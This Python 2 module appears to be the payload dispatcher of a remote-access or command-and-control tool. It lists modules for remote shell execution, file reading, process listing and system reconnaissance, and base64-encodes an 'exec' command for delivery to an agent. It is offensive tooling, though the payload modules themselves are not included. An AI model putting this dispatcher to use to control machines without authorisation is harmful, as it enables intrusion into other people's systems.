import sys
import base64

from modules import shell_exec
from modules import cat
from modules import ipconfig
from modules import ls
from modules import ps
from modules import sysinfo
from modules import shell

from core.color import color

MODULES = ['shell_exec', 'cat', 'ipconfig', 'ls', 'ps', 'sysinfo', 'shell']


def ListModules():
    module_list = []
    for module in MODULES:
        buffer_row = [sys.modules["payloads.modules." + module].module_classification(),
                      sys.modules["payloads.modules." + module].module_description()]
        module_list.append(buffer_row)
    return module_list


def GetPayload(module_name, command):
    try:
        module_name = module_name.split('/')[1]
        if module_name in MODULES:
            payload = sys.modules["payloads.modules." + module_name].run(command)
            return base64.b64encode('exec' + '+' * 5 + payload)
        else:
            return '\x10'
    except Exception as e:
        print color.ReturnError('GetPayload -> ' + str(e))
        return '\x10'
